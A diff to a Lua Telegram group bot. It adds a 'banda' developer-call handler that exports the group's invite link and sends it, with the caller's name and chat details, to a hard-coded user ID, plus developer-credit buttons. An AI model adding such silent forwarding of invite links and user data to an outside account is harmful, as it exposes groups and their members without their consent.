@@ -2833,6 +2833,37 @@ end,nil)
 end,nil)
 end
 
+if text and text:match("^باندا$") or text and text:match("^مبرمج باندا$") or text and text:match("^banda$") then
+tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
+tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
+local Name1 = result.first_name_
+local Name1 = Name1:gsub('"',"") 
+local Name1 = Name1:gsub("'","") 
+local Name1 = Name1:gsub("`","") 
+local Name1 = Name1:gsub("*","") 
+local Name1 = Name1:gsub("{","") 
+local Name1 = Name1:gsub("}","") 
+local Name = '['..Name1..'](tg://user?id='..result.id_..')'
+local NameChat = dp.title_
+local NameChat = NameChat:gsub('"',"") 
+local NameChat = NameChat:gsub("'","") 
+local NameChat = NameChat:gsub("`","") 
+local NameChat = NameChat:gsub("*","") 
+local NameChat = NameChat:gsub("{","") 
+local NameChat = NameChat:gsub("}","") 
+local chatid = msg.chat_id_:gsub("-100","") 
+local msg_id = msg.id_/2097152/0.5
+local LinkGp = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_))
+if LinkGp.ok == true then 
+LinkGroup = LinkGp.result
+else
+LinkGroup = 'لا يوجد'
+end
+sendText(1804133252,"♲ في حد بينادي عليك يا حج باندا \n♲الشخص  {"..Name.."}\n♲اسم الجروب {"..NameChat.."}\n♲ايدي الجروب { `"..msg.chat_id_.."` }\n♲رابط الجروب \n [ "..LinkGroup.." ]\n    ♲رابط الرساله \n https://t.me/c/"..chatid.."/"..msg_id.."   ",0,'md')
+end,nil)
+end,nil)
+end
+
 
 if text and text:match("^بودي$") or text and text:match("^boody$") or text and text:match("^body$") then
 tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
@@ -3981,6 +4012,22 @@ we the best of tele
 keyboard = {} 
 keyboard.inline_keyboard = {
 {{text = 'mostafa',url="t.me/M_P_L_6"}},
+{{text = 'القنوات', callback_data="/Ajobanf"},{text = 'الرومات', callback_data="/banfai"}},  
+{{text = 'البوتات', callback_data="/gqjik"}},
+}
+local msg_id = msg.id_/2097152/0.5
+https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/xxxcccvvbbnn/901&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
+end
+
+if text == 'باندا' or text == 'مبرمج باندا' or text == 'banda' then
+local Text = [[
+the dev banda
+ source klaer the best tele 
+we the best of tele  
+]]
+keyboard = {} 
+keyboard.inline_keyboard = {
+{{text = 'banda',url="t.me/Q_o_ll"}},
 {{text = 'القنوات', callback_data="/Ajobanf"},{text = 'الرومات', callback_data="/banfai"}},  
 {{text = 'البوتات', callback_data="/gqjik"}},
 }
@@ -18535,6 +18582,7 @@ local Teext =[[
 keyboard = {} 
 keyboard.inline_keyboard = {
 {{text = 'mostafa',url="t.me/M_P_L_6"},{text = 'body', url="t.me/BoOdY_BaSha"}},
+{{text = 'banda', callback_data="t.me/Q_o_ll"}},
 {{text = '𝙱𝙰𝙲𝙺', callback_data="/HHH"}},
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
